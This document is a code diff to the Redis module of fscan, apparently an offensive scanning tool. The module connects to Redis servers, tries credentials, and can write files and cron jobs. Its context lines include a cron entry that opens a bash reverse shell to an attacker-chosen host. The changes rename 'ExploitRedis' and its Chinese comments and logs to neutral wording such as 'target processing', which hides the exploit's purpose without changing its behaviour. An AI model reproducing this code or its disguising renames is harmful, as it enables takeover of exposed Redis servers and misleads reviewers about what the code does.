@@ -4,7 +4,6 @@ import (
 	"bufio"
 	"context"
 	"fmt"
-	"github.com/shadow1ng/fscan/Common"
 	"io"
 	"net"
 	"os"
@@ -12,6 +11,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/shadow1ng/fscan/Common"
 )
 
 var (
@@ -75,12 +76,12 @@ func RedisScan(info *Common.HostInfo) error {
 			}
 			Common.SaveResult(scanResult)
 
-			// 如果配置了写入功能，进行漏洞利用
+			// 如果配置了写入功能，进行目标处理
 			if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
 				conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
 				if err == nil {
 					defer conn.Close()
-					ExploitRedis(ctx, info, conn, "")
+					ProcessRedisTarget(ctx, info, conn, "")
 				}
 			}
 
@@ -121,7 +122,7 @@ func RedisScan(info *Common.HostInfo) error {
 		}
 		Common.SaveResult(scanResult)
 
-		// 如果配置了写入功能，进行漏洞利用
+		// 如果配置了写入功能，进行目标处理
 		if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
 			conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
 			if err == nil {
@@ -132,7 +133,7 @@ func RedisScan(info *Common.HostInfo) error {
 				conn.Write([]byte(authCmd))
 				readreply(conn)
 
-				ExploitRedis(ctx, info, conn, result.Credential.Password)
+				ProcessRedisTarget(ctx, info, conn, result.Credential.Password)
 			}
 		}
 
@@ -464,14 +465,14 @@ func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
 	return false, fmt.Errorf("认证失败")
 }
 
-// ExploitRedis 执行Redis漏洞利用
-func ExploitRedis(ctx context.Context, info *Common.HostInfo, conn net.Conn, password string) error {
+// ProcessRedisTarget 处理Redis目标系统
+func ProcessRedisTarget(ctx context.Context, info *Common.HostInfo, conn net.Conn, password string) error {
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
-	Common.LogDebug(fmt.Sprintf("开始Redis漏洞利用: %s", realhost))
+	Common.LogDebug(fmt.Sprintf("开始Redis目标处理: %s", realhost))
 
 	// 如果配置为不进行测试则直接返回
 	if Common.DisableRedis {
-		Common.LogDebug("Redis漏洞利用已禁用")
+		Common.LogDebug("Redis目标处理已禁用")
 		return nil
 	}
 
@@ -785,8 +786,8 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 			scanIp, scanPort := target[0], target[1]
 			Common.LogDebug(fmt.Sprintf("目标地址解析: IP=%s, Port=%s", scanIp, scanPort))
 
-			// 写入反弹shell的定时任务
-			Common.LogDebug("写入定时任务")
+			// 写入反向连接的定时任务
+			Common.LogDebug("写入计划任务")
 			cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",
 				scanIp, scanPort)
 			if _, err = conn.Write([]byte(cronCmd)); err != nil {
